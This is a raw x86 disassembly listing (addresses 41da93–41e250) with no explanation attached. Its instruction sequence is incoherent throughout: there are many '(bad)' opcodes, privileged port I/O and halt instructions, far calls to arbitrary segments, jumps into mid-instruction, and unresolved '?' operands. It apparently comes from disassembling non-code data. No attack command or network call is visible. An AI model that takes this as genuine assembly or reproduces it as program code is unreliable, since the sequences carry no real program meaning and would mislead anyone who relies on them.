  41da93:	call   0x851f:0x1786ac7
  41da9a:	fimul  WORD PTR [edx]
  41da9c:	jnp    0x41dabd
  41da9e:	bound  esp,QWORD PTR [edx]
  41daa0:	jg     0x41da75
  41daa2:	cli    
  41daa3:	push   esp
  41daa4:	add    BYTE PTR [edx],0x2e
  41daa7:	mov    ds:0xba83220f,al
  41daac:	and    ebp,eax
  41daae:	or     DWORD PTR [esi+0xf],0xf78ab1d8
  41dab5:	fistp  WORD PTR [ebp+0x23]
  41dab8:	scas   al,BYTE PTR es:[edi]
  41dab9:	mov    al,ds:0xaf710fa7
  41dabe:	push   ss
  41dabf:	dec    esi
  41dac0:	clc    
  41dac1:	ret    
  41dac2:	jo     0x41db01
  41dac4:	mov    eax,ds:0xfccbf236
  41dac9:	enter  0xe142,0x6c
  41dacd:	or     al,0x97
  41dacf:	loopne 0x41da9c
  41dad1:	test   BYTE PTR [edi],bl
  41dad3:	mov    ds:0x705365a7,eax
  41dad8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dad9:	ror    dl,cl
  41dadb:	sahf   
  41dadc:	sub    eax,0x31b3b599
  41dae1:	inc    esi
  41dae2:	cs dec ebp
  41dae4:	sti    
  41dae5:	pop    esp
  41dae6:	shl    DWORD PTR [ebx],1
  41dae8:	push   esi
  41dae9:	stos   DWORD PTR es:[edi],eax
  41daea:	pop    ecx
  41daeb:	add    BYTE PTR [edi],dl
  41daed:	(bad)  
  41daee:	in     al,0x31
  41daf0:	adc    eax,0x1b97cc22
  41daf5:	iret   
  41daf6:	dec    ebp
  41daf7:	adc    eax,0x3b2a1cae
  41dafc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dafd:	push   esi
  41dafe:	jae    0x41db5e
  41db00:	xor    dl,BYTE PTR [eax]
  41db02:	sub    DWORD PTR [edx],0xb2a3631
  41db08:	mov    dl,0x8b
  41db0a:	aad    0xda
  41db0c:	sbb    al,0xf0
  41db0e:	ret    
  41db0f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41db10:	outs   dx,BYTE PTR ds:[esi]
  41db11:	fistp  DWORD PTR [edx+edi*2]
  41db14:	xchg   cl,ah
  41db16:	xor    eax,0x4e551402
  41db1b:	mov    edi,0xb2ae
	...
  41db28:	add    BYTE PTR [eax],al
  41db2a:	add    dl,bl
  41db2c:	xor    dl,BYTE PTR [edi-0x20500076]
  41db32:	jb     0x41db37
  41db34:	inc    ebp
  41db35:	mov    ds:0x9986aa5c,eax
  41db3a:	js     0x41daf5
  41db3c:	cdq    
  41db3d:	add    DWORD PTR [eax],eax
  41db3f:	stos   DWORD PTR es:[edi],eax
  41db40:	add    BYTE PTR [eax],al
  41db42:	add    ah,dh
  41db44:	pop    es
  41db45:	dec    edi
  41db46:	cmp    al,BYTE PTR [edi+0x30]
  41db49:	neg    BYTE PTR [ecx+0x45]
  41db4c:	adc    DWORD PTR [edx],ecx
  41db4e:	inc    esp
  41db4f:	jp     0x41db94
  41db51:	inc    esi
  41db52:	mov    esp,0xd0181a46
  41db57:	fisttp QWORD PTR [esi-0x8f39fcb]
  41db5d:	pop    esi
  41db5e:	aad    0xda
  41db60:	push   es
  41db61:	sub    al,0xfd
  41db63:	mov    fs,WORD PTR [ecx-0x202fb263]
  41db69:	das    
  41db6a:	push   edi
  41db6b:	por    mm4,QWORD PTR [eax]
  41db6e:	jmp    0x41dba3
  41db70:	int3   
  41db71:	sub    DWORD PTR [ecx+edi*2+0x32],ebp
  41db75:	sub    BYTE PTR fs:[esi-0x4c83d7c2],cl
  41db7c:	pusha  
  41db7d:	cld    
  41db7e:	pop    ds
  41db7f:	nop
  41db80:	or     al,0xb
  41db82:	sub    eax,0x5469d68
  41db87:	and    al,0xcc
  41db89:	in     eax,dx
  41db8a:	sbb    DWORD PTR [edi+0x1b6749a1],ebp
  41db90:	ja     0x41dbc7
  41db92:	jbe    0x41dbd9
  41db94:	sub    al,0x8b
  41db96:	mov    WORD PTR [ebx+0x43b00700],gs
  41db9c:	mov    al,ds:0x1dac625e
  41dba1:	jne    0x41db79
  41dba3:	sub    BYTE PTR [edi+0x47],0x2d
  41dba7:	sub    BYTE PTR [ecx],bh
  41dba9:	dec    eax
  41dbaa:	stc    
  41dbab:	pop    ebp
  41dbac:	retf   0x99dd
  41dbaf:	cs mov dl,0x14
  41dbb2:	xor    BYTE PTR [eax-0x1e182bc9],al
  41dbb8:	je     0x41dc03
  41dbba:	or     ebx,DWORD PTR [eax-0x3b]
  41dbbd:	mov    al,ds:0xcddb330c
  41dbc2:	adc    al,0x12
  41dbc4:	lock les esi,FWORD PTR [edx]
  41dbc7:	div    bh
  41dbc9:	mov    eax,ds:0xc0e1096f
  41dbce:	iret   
  41dbcf:	test   DWORD PTR ds:0x269bdd50,ebx
  41dbd5:	ror    BYTE PTR [esi+esi*8+0x74],1
  41dbd9:	cmp    DWORD PTR [ecx-0x75],ebp
  41dbdc:	dec    edi
  41dbdd:	jl     0x41dbcf
  41dbdf:	mov    ds:0xc9402f3d,eax
  41dbe4:	out    0xd0,eax
  41dbe6:	into   
  41dbe7:	out    dx,al
  41dbe8:	fdivr  st,st(7)
  41dbea:	dec    ebx
  41dbeb:	xchg   DWORD PTR [edx+ecx*4+0x0],esp
	...
  41dbfb:	dec    eax
  41dbfc:	in     al,0x3
  41dbfe:	fwait
  41dbff:	scas   eax,DWORD PTR es:[edi]
  41dc00:	(bad)  
  41dc01:	fdiv   st,st(7)
  41dc03:	pop    esi
  41dc04:	sub    BYTE PTR [eax+0x6b70e48f],bl
  41dc0a:	loop   0x41dc70
  41dc0c:	call   0x0:0xab0001
  41dc13:	mov    DWORD PTR [ebx+ecx*8],esp
  41dc16:	pushf  
  41dc17:	clc    
  41dc18:	sub    eax,DWORD PTR [ebp+0x6a]
  41dc1b:	cmc    
  41dc1c:	push   es
  41dc1d:	not    BYTE PTR ds:0xe0d5fe51
  41dc23:	jmp    0xbb78a368
  41dc28:	(bad)  [edx]
  41dc2a:	leave  
  41dc2b:	rol    BYTE PTR [ebx+eiz*2-0x2ffde6d2],1
  41dc32:	imul   eax,DWORD PTR ds:0x5ef66d9,0x77650b7c
  41dc3c:	stc    
  41dc3d:	mov    ebx,DWORD PTR [edx-0x683f7848]
  41dc43:	call   0xaaadac2b
  41dc48:	sbb    eax,0x4438ef4d
  41dc4d:	push   edx
  41dc4e:	bound  ebp,QWORD PTR ds:[ebx-0x641e2bd4]
  41dc55:	loopne 0x41dc86
  41dc57:	cmp    ebp,DWORD PTR [esi]
  41dc59:	xlat   BYTE PTR ds:[ebx]
  41dc5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dc5b:	dec    ebp
  41dc5c:	aas    
  41dc5d:	pop    eax
  41dc5e:	push   eax
  41dc5f:	arpl   WORD PTR [edi],bp
  41dc61:	in     al,dx
  41dc62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dc63:	test   BYTE PTR [ecx+esi*4-0xcda7d94],bl
  41dc6a:	fist   WORD PTR [esi]
  41dc6c:	mov    dh,0x50
  41dc6e:	repnz sbb al,0x7b
  41dc71:	and    BYTE PTR [ecx-0x14bb051e],0xec
  41dc78:	leave  
  41dc79:	js     0x41dc37
  41dc7b:	sbb    esi,DWORD PTR [edx-0x3]
  41dc7e:	and    eax,0xdcf9526a
  41dc83:	dec    ebx
  41dc84:	mov    esp,0x9f43ee0a
  41dc89:	inc    eax
  41dc8a:	out    dx,eax
  41dc8b:	(bad)  
  41dc8c:	sub    edi,DWORD PTR [edi-0x4c]
  41dc8f:	inc    ebp
  41dc90:	out    dx,al
  41dc91:	rcl    BYTE PTR [edi-0x71263e3],0x97
  41dc98:	xchg   ebp,eax
  41dc99:	jmp    0xdcc43870
  41dc9e:	mov    ds:0xf5053db1,al
  41dca3:	push   cs
  41dca4:	or     esp,DWORD PTR [esi-0x79]
  41dca7:	cmp    eax,0x9351e1f8
  41dcac:	adc    DWORD PTR [ebx],0x23
  41dcaf:	(bad)  
  41dcb2:	leave  
  41dcb3:	test   DWORD PTR [edi],0xb20a4902
  41dcb9:	pop    ecx
  41dcba:	fld    DWORD PTR [ecx]
  41dcbc:	jo     0x41dc6e
	...
  41dcca:	add    BYTE PTR [edx+0x4],dl
  41dccd:	mov    ds:0x72a6f682,al
  41dcd2:	aam    0x6d
  41dcd4:	xor    dh,BYTE PTR [edx]
  41dcd6:	and    eax,0xf48cb822
  41dcdb:	setnp  BYTE PTR [ecx]
  41dcde:	add    BYTE PTR [ebx-0x45000000],ch
  41dce4:	fsin   
  41dce6:	fucomi st,st(3)
  41dce8:	cmc    
  41dce9:	sbb    dl,0x4e
  41dcec:	xor    eax,0x4f00b4ba
  41dcf1:	test   eax,0x9e0c7523
  41dcf6:	cmp    ebp,esi
  41dcf8:	test   al,0xa7
  41dcfa:	leave  
  41dcfb:	sbb    eax,0x315005e5
  41dd00:	jecxz  0x41dce2
  41dd02:	shl    dh,cl
  41dd04:	jmp    FWORD PTR [ebx]
  41dd06:	cmp    DWORD PTR [eax-0x46],0xb
  41dd0a:	inc    ecx
  41dd0b:	cld    
  41dd0c:	test   BYTE PTR [esi],bl
  41dd0e:	(bad)  
  41dd0f:	in     al,0x23
  41dd11:	mov    ebp,0x7c65faa0
  41dd16:	lds    ebx,FWORD PTR [eax-0x30]
  41dd19:	inc    ebx
  41dd1a:	aam    0x23
  41dd1c:	adc    al,0x69
  41dd1e:	or     DWORD PTR [edx+0x4],edx
  41dd21:	mov    ecx,edi
  41dd23:	adc    DWORD PTR [eax+0x11],ebx
  41dd26:	outs   dx,DWORD PTR ds:[esi]
  41dd27:	xor    eax,0x22f4ee0a
  41dd2c:	daa    
  41dd2d:	cli    
  41dd2e:	mov    eax,0xdeb51211
  41dd33:	push   cs
  41dd34:	ins    DWORD PTR es:[edi],dx
  41dd35:	out    0x26,eax
  41dd37:	(bad)  
  41dd38:	sbb    DWORD PTR [edi+edx*2-0x376939f8],edx
  41dd3f:	out    dx,al
  41dd40:	mov    esp,0xfab8b0ba
  41dd45:	call   0xd0c07fd5
  41dd4a:	jmp    0x41dd64
  41dd4c:	xchg   ebp,eax
  41dd4d:	fcmovnb st,st(7)
  41dd4f:	(bad)
  41dd54:	mov    ds:0xb2a2585b,eax
  41dd59:	xchg   edx,eax
  41dd5a:	mov    ah,0x7a
  41dd5c:	icebp  
  41dd5d:	dec    ebx
  41dd5e:	rcl    DWORD PTR [ecx+ecx*4],0x1b
  41dd62:	sbb    esp,DWORD PTR [edx+0x4b]
  41dd65:	xlat   BYTE PTR ds:[ebx]
  41dd66:	div    DWORD PTR [ecx-0x53]
  41dd69:	mov    bl,BYTE PTR ds:0x35e9cffb
  41dd6f:	loop   0x41ddeb
  41dd71:	pop    ecx
  41dd72:	leave  
  41dd73:	cld    
  41dd74:	shl    ch,cl
  41dd76:	inc    edi
  41dd77:	lods   eax,DWORD PTR ds:[esi]
  41dd78:	aas    
  41dd79:	int3   
  41dd7a:	push   ecx
  41dd7b:	(bad)  [esi-0xa]
  41dd7e:	or     DWORD PTR [edi+0x4e],esi
  41dd81:	les    ebp,FWORD PTR [edi-0x48]
  41dd84:	in     al,0xc9
  41dd86:	push   esi
  41dd87:	bound  ebx,QWORD PTR [esi+eax*2+0xe31c139]
	...
  41dd9a:	add    BYTE PTR [eax],bh
  41dd9c:	push   0xffffff96
  41dd9e:	add    edx,esi
  41dda0:	(bad)  
  41dda1:	mov    ebp,0xdb4ef67b
  41dda6:	out    0xd9,eax
  41dda8:	xchg   edi,eax
  41dda9:	inc    esp
  41ddaa:	mov    edi,DWORD PTR [edx-0x54fffe65]
  41ddb0:	add    BYTE PTR [eax],al
  41ddb2:	add    cl,ch
  41ddb4:	(bad)  
  41ddb5:	jnp    0x41ddc6
  41ddb7:	xor    eax,0xdd522753
  41ddbc:	in     eax,0x22
  41ddbe:	mov    dl,0x72
  41ddc0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ddc1:	fidiv  WORD PTR [ecx]
  41ddc3:	call   0x7889:0xd529be59
  41ddca:	fucom  st(7)
  41ddcc:	sahf   
  41ddcd:	scas   eax,DWORD PTR es:[edi]
  41ddce:	and    eax,0xd24ca550
  41ddd3:	test   al,0xf0
  41ddd5:	xor    al,BYTE PTR [edi-0x24af50a5]
  41dddb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dddc:	and    al,0x79
  41ddde:	sti    
  41dddf:	stos   DWORD PTR es:[edi],eax
  41dde0:	imul   ecx,ebx,0xd7d281c9
  41dde6:	fsub   QWORD PTR [edi+0x237e52c7]
  41ddec:	test   al,0xd7
  41ddee:	mov    bl,0xb5
  41ddf0:	mov    esp,0x8a099a47
  41ddf5:	jns    0x41dde7
  41ddf7:	push   eax
  41ddf8:	or     eax,0x42d27177
  41ddfd:	push   esi
  41ddfe:	inc    ebp
  41ddff:	sub    ah,dl
  41de01:	jmp    0x41de0b
  41de03:	add    ebx,DWORD PTR [edi-0x2040bf39]
  41de09:	inc    ecx
  41de0a:	and    bl,BYTE PTR [ebp+0x19]
  41de0d:	jo     0x41dda1
  41de0f:	div    DWORD PTR [edi+edi*8]
  41de12:	and    BYTE PTR [eax-0x3f1836ea],al
  41de18:	fwait
  41de19:	pushf  
  41de1a:	dec    ecx
  41de1b:	push   cs
  41de1c:	jbe    0x41ddf9
  41de1e:	mov    eax,ds:0xe3a80062
  41de23:	imul   esp,DWORD PTR [esi+0x6b9cb6d7],0xa1dd98ff
  41de2d:	cmp    BYTE PTR [eax+0x65dc7eff],bh
  41de33:	xor    BYTE PTR [eax],0x10
  41de36:	pop    esp
  41de37:	jbe    0x41ddf8
  41de39:	(bad)  
  41de3a:	gs jne 0x41ddbf
  41de3d:	loopne 0x41de39
  41de3f:	icebp  
  41de40:	call   DWORD PTR [edi-0x7f]
  41de43:	adc    bh,BYTE PTR [ebp+0x6f8da540]
  41de49:	sbb    dh,BYTE PTR [edi+0x48a86f39]
  41de4f:	pop    esi
  41de50:	jns    0x41ddd2
  41de52:	push   ebx
  41de53:	test   eax,0x812e2af5
  41de58:	pop    ebx
  41de59:	mov    edx,?
  41de5b:	in     al,dx
  41de5c:	loop   0x41de2e
	...
  41de6a:	add    cl,ch
  41de6c:	mov    ecx,0xf37a307a
  41de71:	jmp    0x41de6c
  41de73:	fimul  DWORD PTR [esp+eax*2+0x6c]
  41de77:	outs   dx,BYTE PTR ds:[esi]
  41de78:	xor    eax,0x9c65b9e3
  41de7d:	add    DWORD PTR [eax],eax
  41de7f:	stos   DWORD PTR es:[edi],eax
  41de80:	add    BYTE PTR [eax],al
  41de82:	add    BYTE PTR [ebx-0x6298de24],bh
  41de88:	xchg   cl,bh
  41de8a:	xchg   BYTE PTR [edi],al
  41de8c:	fcmovne st,st(5)
  41de8e:	mov    edi,0xc149efa4
  41de93:	fmulp  st(2),st
  41de95:	aam    0x5a
  41de97:	sbb    ah,BYTE PTR [edx]
  41de99:	pusha  
  41de9a:	mov    bh,0x73
  41de9c:	lahf   
  41de9d:	outs   dx,BYTE PTR ds:[esi]
  41de9e:	data16 fidivr DWORD PTR [esi]
  41dea1:	mov    ds:0xbaf12636,eax
  41dea6:	hlt    
  41dea7:	mov    WORD PTR [edi+0x3c],?
  41deaa:	jne    0x41dea7
  41deac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dead:	xor    bh,BYTE PTR [edi-0xbbd6405]
  41deb3:	(bad)  
  41deb4:	mov    bh,0xd1
  41deb6:	jp     0x41def9
  41deb8:	mov    ds:0xb6c695fa,eax
  41debd:	pop    esi
  41debe:	cld    
  41debf:	sub    al,0xf8
  41dec1:	push   0xffffffaa
  41dec3:	jnp    0x41de60
  41dec5:	leave  
  41dec6:	test   al,0xb9
  41dec8:	mov    edx,0x59de73e
  41decd:	(bad)  
  41dece:	and    edx,DWORD PTR [edi-0x1d]
  41ded1:	add    eax,0xe531a5b3
  41ded6:	inc    ebp
  41ded7:	outs   dx,BYTE PTR ds:[esi]
  41ded8:	mov    al,ds:0x2438f96d
  41dedd:	test   DWORD PTR [edx],edi
  41dedf:	nop
  41dee0:	daa    
  41dee1:	mov    edx,DWORD PTR [edx+eiz*4+0x42731e0]
  41dee8:	fwait
  41dee9:	sub    DWORD PTR [ebp+0x7f19e87],0x2a9f79ed
  41def3:	test   al,0x95
  41def5:	lods   al,BYTE PTR ds:[esi]
  41def6:	ins    DWORD PTR es:[edi],dx
  41def7:	cmc    
  41def8:	cld    
  41def9:	popf   
  41defa:	xor    bl,BYTE PTR [ebx+0x3cae8e87]
  41df00:	and    BYTE PTR [ecx],ch
  41df02:	in     al,dx
  41df03:	daa    
  41df04:	mov    ds:0xf5b48af1,al
  41df09:	daa    
  41df0a:	in     al,0xe7
  41df0c:	fcomp  DWORD PTR [eax]
  41df0e:	ret    
  41df0f:	mov    edi,0x3d13294d
  41df14:	dec    edx
  41df15:	lods   al,BYTE PTR ds:[esi]
  41df16:	in     eax,dx
  41df17:	dec    ebx
  41df18:	clc    
  41df19:	ins    BYTE PTR es:[edi],dx
  41df1a:	pop    ss
  41df1b:	mov    edx,0xa6260b4e
  41df20:	xchg   ecx,eax
  41df21:	es scas al,BYTE PTR es:[edi]
  41df23:	leave  
  41df24:	enter  0xadca,0xfc
  41df28:	cmp    ch,BYTE PTR [ecx-0x11]
  41df2b:	pop    ebp
  41df2c:	xor    esi,DWORD PTR [ebx+0x0]
	...
  41df3a:	add    BYTE PTR [ebx+0x41],bl
  41df3d:	pop    ebx
  41df3e:	iret   
  41df3f:	pop    ebx
  41df40:	(bad)  
  41df42:	aad    0xf
  41df44:	ss dec esp
  41df46:	dec    esi
  41df47:	loopne 0x41df7a
  41df49:	or     ah,BYTE PTR [eax+edx*1-0x54fffe63]
  41df50:	add    BYTE PTR [eax],al
  41df52:	add    BYTE PTR ds:0x8b32d77b,al
  41df58:	sub    dl,BYTE PTR [edx-0x5f]
  41df5b:	enter  0x8106,0x4c
  41df5f:	sbb    DWORD PTR [ecx+ebp*4],ebx
  41df62:	fild   QWORD PTR [ebx+eax*2+0x71]
  41df66:	xlat   BYTE PTR ds:[ebx]
  41df67:	jmp    0x95a50dbb
  41df6c:	mov    esi,0xe604f271
  41df71:	add    DWORD PTR [eax+edi*1-0x6062968e],0x25
  41df79:	ss jnp 0x41dfcd
  41df7c:	adc    dh,ch
  41df7e:	xor    BYTE PTR [eax-0x10da45c5],0x23
  41df85:	mov    ?,WORD PTR [esi-0x34]
  41df88:	aas    
  41df89:	jle    0x41dffb
  41df8b:	aad    0x83
  41df8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41df8e:	dec    edx
  41df8f:	sub    BYTE PTR [ebx],ah
  41df91:	aas    
  41df92:	jle    0x41df87
  41df94:	fwait
  41df95:	or     al,0xb3
  41df97:	cs xchg ebp,eax
  41df99:	sbb    al,0x84
  41df9b:	in     al,dx
  41df9c:	or     eax,0x2d22edfd
  41dfa1:	cli    
  41dfa2:	out    dx,al
  41dfa3:	ret    0x38bb
  41dfa6:	jp     0x41dfdf
  41dfa8:	out    0x9a,al
  41dfaa:	add    DWORD PTR [eax-0x59],ebx
  41dfad:	hlt    
  41dfae:	(bad)  
  41dfaf:	sbb    ebp,DWORD PTR [edi-0x7f]
  41dfb2:	sub    al,0x8f
  41dfb4:	sub    cl,BYTE PTR [ebp+edx*4-0x3069a5bf]
  41dfbb:	int3   
  41dfbc:	fsubr  QWORD PTR [esi-0x5a]
  41dfbf:	mov    al,0xc
  41dfc1:	cld    
  41dfc2:	popf   
  41dfc3:	sbb    al,0x4d
  41dfc5:	idiv   BYTE PTR [eax]
  41dfc7:	xor    BYTE PTR [ebp+0x43],ah
  41dfca:	pop    edi
  41dfcb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dfcc:	adc    eax,0x18297596
  41dfd1:	or     BYTE PTR [ebx-0x46d04f13],0xc9
  41dfd8:	mov    eax,ds:0xaf9f2183
  41dfdd:	sbb    bl,BYTE PTR [ebx]
  41dfdf:	data16 hlt 
  41dfe1:	lds    ecx,FWORD PTR [eax]
  41dfe3:	mov    ebx,0x2fb1531d
  41dfe8:	mov    dl,0xdc
  41dfea:	push   eax
  41dfeb:	cmp    edi,ebx
  41dfed:	jnp    0x41e053
  41dfef:	sbb    edx,DWORD PTR [ecx+eax*8-0x6bb409d4]
  41dff6:	pop    ebx
  41dff7:	es mov ch,0x92
  41dffa:	call   0x0:0xabc51e
	...
  41e009:	add    BYTE PTR [eax],al
  41e00b:	fwait
  41e00c:	test   DWORD PTR [ebp+0x3c],esp
  41e00f:	jg     0x41e00d
  41e011:	(bad)  [edi-0x65be08a1]
  41e017:	add    eax,0xbbac43ba
  41e01c:	popf   
  41e01d:	add    DWORD PTR [eax],eax
  41e01f:	stos   DWORD PTR es:[edi],eax
  41e020:	add    BYTE PTR [eax],al
  41e022:	add    BYTE PTR [esi+eiz*8],al
  41e025:	pop    esi
  41e026:	push   es
  41e027:	pop    es
  41e028:	test   BYTE PTR ds:0x8e24966a,cl
  41e02e:	out    dx,al
  41e02f:	nop
  41e030:	lods   al,BYTE PTR ds:[esi]
  41e031:	loope  0x41e08f
  41e033:	and    ah,bh
  41e035:	out    dx,al
  41e036:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e037:	inc    ecx
  41e038:	ds (bad) 
  41e03a:	jp     0x41e083
  41e03c:	pop    esp
  41e03d:	mov    esp,0x80de2c36
  41e042:	inc    ebx
  41e043:	sbb    ah,BYTE PTR [edx]
  41e045:	pop    es
  41e046:	cmp    DWORD PTR [ecx+0x39],edi
  41e049:	lods   al,BYTE PTR ds:[esi]
  41e04a:	fwait
  41e04b:	push   esi
  41e04c:	mov    ebx,ecx
  41e04e:	int    0x3b
  41e050:	scas   al,BYTE PTR es:[edi]
  41e051:	jae    0x41e020
  41e053:	or     al,0x95
  41e055:	jmp    eax
  41e057:	ret    
  41e058:	int    0xaf
  41e05a:	ret    0x6515
  41e05d:	stos   DWORD PTR es:[edi],eax
  41e05e:	retf   
  41e05f:	mov    ah,0xcf
  41e061:	iret   
  41e062:	push   cs
  41e063:	into   
  41e064:	dec    esp
  41e065:	out    dx,al
  41e066:	lahf   
  41e067:	aad    0x89
  41e069:	arpl   WORD PTR [ecx+0x3a],ax
  41e06c:	and    ebp,DWORD PTR [ebx-0x6f95ad5b]
  41e072:	hlt    
  41e073:	or     al,0x70
  41e075:	mov    dh,0x79
  41e077:	ret    0xce31
  41e07a:	pop    ebx
  41e07b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e07c:	and    eax,0x63b7a5f4
  41e081:	inc    ebp
  41e082:	leave  
  41e083:	or     BYTE PTR [ebp-0x4165f19f],bh
  41e089:	xor    bl,bh
  41e08b:	xchg   ecx,eax
  41e08c:	shr    ah,cl
  41e08e:	jo     0x41e0a0
  41e090:	xchg   edi,eax
  41e091:	out    dx,eax
  41e092:	mov    cl,0xe6
  41e094:	jae    0x41e105
  41e096:	and    ecx,DWORD PTR [eax-0x78]
  41e099:	mov    dl,0x29
  41e09b:	xchg   DWORD PTR [ecx],esp
  41e09d:	push   0xffffff97
  41e09f:	mov    BYTE PTR [ecx+0x7b3d014c],dh
  41e0a5:	test   al,0xd7
  41e0a7:	aaa    
  41e0a8:	and    al,0x51
  41e0aa:	jns    0x41e042
  41e0ac:	inc    eax
  41e0ad:	stos   DWORD PTR es:[edi],eax
  41e0ae:	(bad)  
  41e0af:	pop    ds
  41e0b0:	push   0xe35f5f5b
  41e0b5:	dec    eax
  41e0b6:	mov    al,bl
  41e0b8:	mov    cl,0x75
  41e0ba:	ret    0xd97
  41e0bd:	xchg   ecx,eax
  41e0be:	mov    esi,0x6f2e8885
  41e0c3:	retf   0x3bf8
  41e0c6:	pusha  
  41e0c7:	mov    esp,0x17677913
  41e0cc:	mov    cl,0xee
	...
  41e0da:	add    BYTE PTR [esi+0x73],ch
  41e0dd:	lock retf 0xcbfd
  41e0e1:	jle    0x41e0da
  41e0e3:	repz xor eax,0xda198ce9
  41e0e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e0ea:	enter  0x9e66,0x1
  41e0ee:	add    BYTE PTR [ebx-0x2c000000],ch
  41e0f4:	push   edi
  41e0f5:	int    0xd6
  41e0f7:	mov    bl,0xc2
  41e0f9:	and    DWORD PTR [edx],ebp
  41e0fb:	mov    bh,0x39
  41e0fd:	inc    ebp
  41e0fe:	je     0x41e082
  41e100:	pop    esp
  41e101:	push   esp
  41e102:	push   eax
  41e103:	rcl    BYTE PTR [edx+esi*2+0x7c0075d6],0xcf
  41e10b:	mov    edx,0xcbe5bd89
  41e110:	push   ds
  41e111:	ja     0x41e0dd
  41e113:	sti    
  41e114:	add    BYTE PTR [eax],al
  41e116:	sub    bh,BYTE PTR [ebp+0x1a]
  41e119:	in     eax,dx
  41e11a:	out    dx,eax
  41e11b:	xor    eax,0x74c6c89c
  41e120:	add    eax,0x3aa597e2
  41e125:	mov    cl,0x9c
  41e127:	repnz clc 
  41e129:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e12a:	xor    ebx,DWORD PTR [eax+ecx*4-0xc]
  41e12e:	test   BYTE PTR [ebp+0x5c013250],0x33
  41e135:	sub    dl,bl
  41e137:	inc    ebx
  41e138:	inc    edi
  41e139:	das    
  41e13a:	daa    
  41e13b:	test   al,0x56
  41e13d:	das    
  41e13e:	push   edi
  41e13f:	ds scas eax,DWORD PTR es:[edi]
  41e141:	mov    gs,ecx
  41e143:	mov    ah,BYTE PTR [ebp+eax*8+0x1f]
  41e147:	arpl   WORD PTR [esi],si
  41e149:	pop    eax
  41e14a:	gs repz loopne 0x41e194
  41e14e:	mov    esp,0xe52db31e
  41e153:	dec    ebp
  41e154:	jo     0x41e107
  41e156:	push   ds
  41e157:	push   esi
  41e158:	loope  0x41e131
  41e15a:	das    
  41e15b:	ficom  WORD PTR [ebx-0xbbab86e]
  41e161:	(bad)  
  41e162:	jl     0x41e1af
  41e164:	inc    esi
  41e165:	add    BYTE PTR [edx+0x5d9de971],bl
  41e16b:	scas   eax,DWORD PTR es:[edi]
  41e16c:	push   0xbe804d95
  41e171:	lds    eax,FWORD PTR [eax+ecx*2+0x1a76e14a]
  41e178:	loopne 0x41e113
  41e17a:	xchg   ebx,eax
  41e17b:	xor    DWORD PTR [edx-0x1],esi
  41e17e:	xchg   ebx,edi
  41e180:	inc    ebx
  41e181:	mov    ah,0x27
  41e183:	out    dx,al
  41e184:	cmp    BYTE PTR [edx+0x6e6b1fdc],ch
  41e18a:	(bad)  
  41e18b:	or     eax,0xf01f25e2
  41e190:	jecxz  0x41e15b
  41e192:	loope  0x41e139
  41e194:	js     0x41e1ee
  41e196:	xor    eax,0xb9366edd
  41e19b:	in     al,dx
  41e19c:	adc    BYTE PTR [eax+eax*1+0x0],dh
	...
  41e1ab:	cmc    
  41e1ac:	adc    al,0xae
  41e1ae:	adc    ebp,edi
  41e1b0:	mov    ebx,0x84e6f6fd
  41e1b5:	lds    ebp,FWORD PTR [edx-0x3e0c0a54]
  41e1bb:	adc    DWORD PTR [edi+0xab0001],ebx
  41e1c1:	add    BYTE PTR [eax],al
  41e1c3:	leave  
  41e1c4:	pop    ebp
  41e1c5:	ret    
  41e1c6:	(bad)  
  41e1c7:	sub    eax,0xc6dc3418
  41e1cc:	lods   eax,DWORD PTR ds:[esi]
  41e1cd:	add    DWORD PTR [eax+ebx*2],0xffffffa4
  41e1d1:	push   edx
  41e1d2:	inc    ecx
  41e1d3:	je     0x41e1ff
  41e1d5:	mov    ds:0x3d7d9abd,al
  41e1da:	loope  0x41e1ea
  41e1dc:	and    eax,0xceebad93
  41e1e1:	push   cs
  41e1e2:	jecxz  0x41e1ca
  41e1e4:	xchg   edi,eax
  41e1e5:	lds    edi,FWORD PTR [esi+0x5]
  41e1e8:	cli    
  41e1e9:	lods   al,BYTE PTR ds:[esi]
  41e1ea:	add    BYTE PTR [ebp+0x1a],ah
  41e1ed:	iret   
  41e1ee:	add    esi,DWORD PTR ds:0x19621fd2
  41e1f4:	xchg   edx,eax
  41e1f5:	mov    ebp,DWORD PTR [eax]
  41e1f7:	add    esi,DWORD PTR [esi-0x53]
  41e1fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e1fb:	mov    ebx,0x374a299b
  41e200:	test   BYTE PTR [edx+ebp*1+0x14],cl
  41e204:	arpl   WORD PTR [ebx+ebp*8+0x1f21718e],bp
  41e20b:	or     BYTE PTR [edx+0x28],ch
  41e20e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e20f:	inc    ecx
  41e210:	fnstenv [eax+ecx*8-0xa2b3f3d]
  41e217:	mov    ebx,0x83c838e0
  41e21c:	stos   DWORD PTR es:[edi],eax
  41e21d:	shl    BYTE PTR [edx+0x6b80c71a],cl
  41e223:	pop    esp
  41e224:	popf   
  41e225:	shl    cl,1
  41e227:	clc    
  41e228:	xor    eax,0x40b5e578
  41e22d:	push   0x20
  41e22f:	push   esp
  41e230:	lea    edi,[edx-0x73]
  41e233:	jge    0x41e241
  41e235:	sahf   
  41e236:	es jb  0x41e2b3
  41e239:	out    0x1,eax
  41e23b:	add    ebx,DWORD PTR [ebp+0x42b999cb]
  41e241:	inc    esp
  41e242:	pop    edx
  41e243:	rol    bl,1
  41e245:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e246:	popa   
  41e247:	test   al,0xc8
  41e249:	pop    edi
  41e24a:	repnz mov al,0x99
  41e24d:	in     al,dx
  41e24e:	mov    ch,0x4c
  41e250:	shl    BYTE PTR [ebp+0x5bea836d],cl
